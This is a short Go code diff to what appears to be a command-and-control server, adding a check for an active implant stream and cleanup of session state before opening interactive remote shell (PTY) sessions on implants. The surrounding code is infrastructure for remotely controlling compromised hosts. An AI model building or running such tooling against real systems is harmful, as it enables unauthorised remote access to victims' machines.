@@ -915,6 +915,16 @@ func (s *C2Server) PTYStream(stream pb.C2Service_PTYStreamServer) error {
 	cols := om.Open.Cols
 	rows := om.Open.Rows
 
+	// Check if implant has an active stream before proceeding
+	s.streamsMux.RLock()
+	_, hasStream := s.streams[implantID]
+	s.streamsMux.RUnlock()
+
+	if !hasStream {
+		logrus.Warnf("PTY session failed: no active stream for implant %s (may be in polling mode)", implantID)
+		return fmt.Errorf("implant %s has no active stream - interactive shell requires stream mode (implant may be using polling)", implantID)
+	}
+
 	commandID := fmt.Sprintf("pty_%d", time.Now().UnixNano())
 
 	logrus.Infof("PTY session started: %s for implant %s (terminal size: %dx%d)",
@@ -927,6 +937,15 @@ func (s *C2Server) PTYStream(stream pb.C2Service_PTYStreamServer) error {
 	s.ptySessionsActive[implantID] = commandID // Track active session for recovery
 	s.ptyMux.Unlock()
 
+	// Cleanup function for error cases
+	cleanupPTYMappings := func() {
+		s.ptyMux.Lock()
+		delete(s.ptyCommandToImp, commandID)
+		delete(s.ptyCommandToCon, commandID)
+		delete(s.ptySessionsActive, implantID)
+		s.ptyMux.Unlock()
+	}
+
 	// Send PTY_START to implant over Beacon stream
 	startCmd := &pb.CommandMessage{
 		CommandId: commandID,
@@ -936,7 +955,8 @@ func (s *C2Server) PTYStream(stream pb.C2Service_PTYStreamServer) error {
 		Timeout:   0,
 	}
 	if err := s.SendCommandMessage(implantID, startCmd); err != nil {
-		return err
+		cleanupPTYMappings()
+		return fmt.Errorf("failed to send PTY start command: %v", err)
 	}
 
 	// Loop for input/resize/close from console
